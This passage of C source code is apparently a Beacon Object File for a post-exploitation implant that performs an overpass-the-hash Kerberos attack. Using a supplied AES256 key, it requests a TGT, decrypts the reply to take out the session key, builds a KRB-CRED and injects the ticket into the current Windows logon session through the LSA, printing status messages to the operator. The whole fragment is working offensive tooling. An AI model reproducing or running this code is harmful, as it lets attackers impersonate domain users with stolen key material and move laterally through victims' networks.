        HEAP_FREE(work); return;
    }

    const uint8_t* ticket_blob = NULL; int tblob = 0;
    const uint8_t* cipher = NULL;      int clen = 0;
    int rc = parse_as_rep(as_rep, as_rep_len, &ticket_blob, &tblob, &cipher, &clen);
    if (rc != 1) {
        if (rc == -1)
            BeaconPrintf(CALLBACK_ERROR, "overpass: KDC returned KRB-ERROR (likely preauth-failed; wrong AES256?)");
        else
            BeaconPrintf(CALLBACK_ERROR, "overpass: AS-REP parse failed");
        HEAP_FREE(as_rep); HEAP_FREE(work); return;
    }

    /* Decrypt enc-part with usage 3. */
    uint8_t* plain = (uint8_t*)HEAP_ALLOC((SIZE_T)clen);
    int plen = 0;
    if (!plain || !kerb_decrypt(key, cipher, clen, 3, plain, &plen)) {
        BeaconPrintf(CALLBACK_ERROR, "overpass: enc-part decrypt failed (HMAC mismatch or bad key)");
        if (plain) HEAP_FREE(plain); HEAP_FREE(as_rep); HEAP_FREE(work); return;
    }

    int32_t etype = 0; uint8_t sessk[64]; int sessk_len = 0;
    const uint8_t* body = NULL; int bodylen = 0;
    if (!extract_session_key(plain, plen, &etype, sessk, (int)sizeof(sessk), &sessk_len, &body, &bodylen)) {
        BeaconPrintf(CALLBACK_ERROR, "overpass: couldn't extract session key from EncASRepPart");
        HEAP_FREE(plain); HEAP_FREE(as_rep); HEAP_FREE(buf); HEAP_FREE(work); return;
    }

    uint8_t* kci = (uint8_t*)HEAP_ALLOC(1024); int kci_len = 0;
    if (!kci || !reemit_krbcredinfo(body, bodylen, sessk, sessk_len, etype, realm, user, kci, 1024, &kci_len)) {
        BeaconPrintf(CALLBACK_ERROR, "overpass: KrbCredInfo build failed");
        if (kci) HEAP_FREE(kci); HEAP_FREE(plain); HEAP_FREE(as_rep); HEAP_FREE(buf); HEAP_FREE(work); return;
    }

    uint8_t* cred = (uint8_t*)HEAP_ALLOC(4096); int cred_len = 0;
    if (!cred || !build_krb_cred(ticket_blob, tblob, kci, kci_len, cred, 4096, &cred_len)) {
        BeaconPrintf(CALLBACK_ERROR, "overpass: KRB-CRED build failed");
        if (cred) HEAP_FREE(cred); HEAP_FREE(kci); HEAP_FREE(plain); HEAP_FREE(as_rep); HEAP_FREE(buf); HEAP_FREE(work); return;
    }

    if (!submit_krb_cred_to_lsa(cred, cred_len)) {
        BeaconPrintf(CALLBACK_ERROR, "overpass: LsaCallAuthenticationPackage(KerbSubmitTicketMessage) failed");
        HEAP_FREE(cred); HEAP_FREE(kci); HEAP_FREE(plain); HEAP_FREE(as_rep); HEAP_FREE(buf); HEAP_FREE(work); return;
    }

    bof_printf(
        "overpass: TGT for %s (%s) obtained (%d bytes) and submitted to current LUID. Run `klist` to verify.\n",
        user, realm, cred_len);
    bof_flush();

    HEAP_FREE(cred); HEAP_FREE(kci); HEAP_FREE(plain); HEAP_FREE(as_rep); HEAP_FREE(buf); HEAP_FREE(work);
}
